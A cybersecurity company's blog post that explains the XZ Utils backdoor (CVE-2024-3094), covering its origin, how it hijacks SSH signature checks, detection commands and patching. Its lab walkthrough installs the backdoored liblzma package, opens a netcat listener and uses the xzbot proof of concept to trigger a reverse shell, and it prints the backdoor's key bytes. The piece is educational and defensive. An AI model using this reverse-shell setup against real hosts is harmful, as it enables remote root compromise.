---
title: "XZ Utils: the backdoor shaking the free world and cybersecurity"
description: "XZ Utils has a significant backdoor in its latest versions 5.6.0 and 5.6.1. However, its exploitation is not trivial."
date: 2024-04-01T10:21:17+01:00
draft: false
images: [/images/xz-utils-la-backdoor-faisant-trembler-le-monde-libre/logo.png]
featuredImage: "/images/xz-utils-la-backdoor-faisant-trembler-le-monde-libre/logo.png"
featuredImagePreview: "/images/xz-utils-la-backdoor-faisant-trembler-le-monde-libre/logo.png"
tags: ["Penetration Testing", "Pentest", "Audit"]
---

# 🕶️ New and scandalous backdoor in XZ Utils on Linux

## Introduction

On **March 29, 2024**, a major security flaw was discovered in `XZ Utils`, a package widely used in popular Linux distributions. This flaw, known as **CVE-2024-3094**, allows attackers to **execute code remotely** on affected systems.

## TL;DR

**CVE-2024-3094** introduces a backdoor into the OpenSSH server, allowing attackers in possession of a **UNIQUE** private key to launch commands before the authentication step.

- This backdoor **cannot be used** without possessing the proper private key.
- The proper private key is not **public**.
- It allows commands to be executed as `root` user.
- A patch is **available**.

![XZ Utils](/images/xz-utils-la-backdoor-faisant-trembler-le-monde-libre/1.png)

## The origin

The origin of this flaw comes from an individual named **Jia Tan** who joined the XZ Utils project in **2022**. Over time, he gained the trust of other contributors and obtained increasingly significant permissions, allowing him to release **new versions of the software**.

It was in versions `5.6.0` and `5.6.1` of `XZ Utils` that **Jia Tan** introduced a backdoor, malicious code capable of taking control of affected systems. This code, absent from the public repository of the project, was added only in the compressed source code versions available for download by users on GitHub.

The operation of the backdoor is **highly complex** and relies on several techniques to evade detection. Notably, it uses specific **compiler functions**, **hidden files**, and **scripts executed during the compilation** of the `XZ Utils` library.

🎯 Its ultimate goal is to replace a function of the **SSH** library, allowing attackers to connect to the system **without authentication** and execute any command.

## Technical Details

The technicality of the backdoor is fascinating and uses a clever system to bypass authentication:

1. The malicious functionalities are primarily located in the file `/usr/lib/liblzma.so.5.6.1`.
2. The payload hijacks the `RSA_public_decrypt` function used for signature verification.
3. The malicious code then examines the public `RSA` module (modulo n) transmitted in the `RSA` structure (4th argument of `RSA_public_decrypt`). This value is communicated by the attacker during SSH authentication.
4. The backdoor decrypts and verifies the signature using a public ED448 key (below)
```
0a 31 fd 3b 2f 1f c6 92 92 68 32 52 c8 c1 ac 28
34 d1 f2 c9 75 c4 76 5e b1 f6 88 58 88 93 3e 48
10 0c b0 6c 3a be 14 ee 89 55 d2 45 00 c7 7f 6e
20 d3 2c 60 2b 2c 6d 31 00
```
5. Only the attacker possesses the private key linked to this public key.
6. If the signature is valid, the command sent by the attacker is passed into `system()` and executed as `root`.

{{< admonition tips "More Info!" >}}
If you want more technical details, you can check out the excellent article at https://jfrog.com/blog/xz-backdoor-attack-cve-2024-3094-all-you-need-to-know/
{{< /admonition >}}

## Exploitation

So, the big question! Is it easily exploitable? The answer is **NO**.

### Detection

To start, you can use the command below to check if you are vulnerable:

```bash
strings \`which xz\` | grep '5\\.6\\.[01]'

XZ_5.6.0
xz (XZ Utils) 5.6.1
```

Here's another command that confirms your vulnerability:

```sh
strings \`which xz\` | grep '5\\.6\\.[01]'

xz (XZ Utils) 5.6.1
```

In another case, a healthy machine will return nothing.

```sh
strings \`which xz\` | grep '5\\.6\\.[01]'
```

### Step by Step

The exploitation is not very complex. However, it's important to keep in mind that mass exploitation is not possible because **you do not know the attacker's private key.**

In our lab, we will modify the attacker's public key with ours to ensure the correct signature.

To begin, it's necessary to install the vulnerable version on the machine to be exploited.

```bash
sudo apt remove xz-utils
wget https://snapshot.debian.org/archive/debian/20240328T025657Z/pool/main/x/xz-utils/liblzma5_5.6.1-1_amd64.deb
dpkg -i liblzma5_5.6.1-1_amd64.deb 
```

![alt text](/images/xz-utils-la-backdoor-faisant-trembler-le-monde-libre/demo1.png)

Verify that you are indeed vulnerable with the command:

```bash
xz -V                                

xz (XZ Utils) 5.6.1
liblzma 5.6.1
```

Locate and modify the backdoor signature:

```bash
sudo find / -name "liblzma.so.5.6.1" 2> /dev/null

# /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1
                                                                                                                   
shasum -a 256 /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1

# 605861f833fc181c7cdcabd5577ddb8989bea332648a8f498b4eef89b8f85ad4  /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1
```

{{< admonition tips "More Info!" >}}
If you need help with this step: https://github.com/amlweems/xzbot
{{< /admonition >}}

![alt text](/images/xz-utils-la-backdoor-faisant-trembler-le-monde-libre/demo2.png)

![alt text](/images/xz-utils-la-backdoor-faisant-trembler-le-monde-libre/demo3.png)

Start the `SSH` service:

```sh
sudo systemctl start ssh
```

![alt text](/images/xz-utils-la-backdoor-faisant-trembler-le-monde-libre/demo4.png)

Build the PoC binary and open a `netcat` listener.

```sh
go build .

# Other terminal
nc -lvp 4444
```

![alt text](/images/xz-utils-la-backdoor-faisant-trembler-le-monde-libre/demo5.png)

Trigger the backdoor with the command `xzbot -addr 127.0.0.1 -cmd '<command>'`. The example below triggers the execution of a reverse shell.

![alt text](/images/xz-utils-la-backdoor-faisant-trembler-le-monde-libre/demo6.png)

Finally, some articles mention the presence of a KillSwitch via the environment variable `yolAbejyiejuvnup=Evjtgvsh5okmkAvj`. This seems to have no effect 🤔

![alt text](/images/xz-utils-la-backdoor-faisant-trembler-le-monde-libre/demo7.png)

## Risks

🤔 Is there a risk to my company?

**Yes, but quite low!**

As mentioned in the article above, it's not possible to use the backdoor **without having the private key**. Only the attacker who originated the backdoor is capable of using it.

However, to date, we do not know who the actual actor behind this malicious code is. Out of caution, it is therefore strongly advised to patch your instances.

## Correction

The fix is quite simple. There are 2 solutions:
- Upgrade to version `5.6.1-r2`.
- Downgrade to version `5.4.6`.

Generic update example on a `Debian` system:

```sh
sudo apt update && sudo apt-dist upgrade -y
```

## Demo

A short demonstration below to present the exploitation of the vulnerability on a vulnerable virgin machine.

<video src="/images/xz-utils-la-backdoor-faisant-trembler-le-monde-libre/exploit.mp4" controls autoplay loop title="Exploiting the XZ Utils backdoor" style="width:100%"></video>

## In Conclusion

The backdoor attack in `XZ Utils` is a striking example of the dangers associated with free software. Trust in contributors is essential, but it should not prevent the implementation of security measures to prevent such incidents.

In the case of the `XZ Utils` attack, regular penetration testing could have detected the backdoor at an early stage.

- **Source code analysis**: auditors could have analyzed the source code of `XZ Utils` to identify anomalies or potential vulnerabilities.
- **Penetration testing**: comprehensive penetration tests could have been carried out to identify other security flaws in the system.

**Trackflaw** is ready to assist you with these crucial steps, get in touch with us! 👋

## Sources 

- https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know
- https://jfrog.com/blog/xz-backdoor-attack-cve-2024-3094-all-you-need-to-know/
- https://github.com/amlweems/xzbot
- https://snapshot.debian.org/package/xz-utils/5.6.1-1/